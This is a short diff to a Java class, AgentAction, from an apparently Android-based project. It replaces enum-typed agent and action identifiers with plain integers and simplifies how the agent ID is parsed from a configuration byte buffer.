@@ -23,7 +23,7 @@ import com.android.service.util.DataBuffer;
 public abstract class AgentAction extends SubAction {
 	private static final String TAG = "AgentAction";
 	
-	protected AgentType agentId;
+	protected int agentId;
 	
 	/**
 	 * Instantiates a new stop agent action.
@@ -33,7 +33,7 @@ public abstract class AgentAction extends SubAction {
 	 * @param confParams
 	 *            the conf params
 	 */
-	public AgentAction(final SubActionType type, final byte[] confParams) {
+	public AgentAction(final int type, final byte[] confParams) {
 		super(type, confParams);
 	}
 
@@ -41,9 +41,8 @@ public abstract class AgentAction extends SubAction {
 	protected boolean parse(byte[] params) {
 		final DataBuffer databuffer = new DataBuffer(params, 0, params.length);
 		try {
-			int type = databuffer.readInt();
-			agentId = AgentType.get(type);
-
+			agentId = databuffer.readInt();
+			
 		} catch (final IOException e) {
 			if(Cfg.DEBUG) Check.log( TAG + " (parse) Error: " + e.toString());
 			return false;
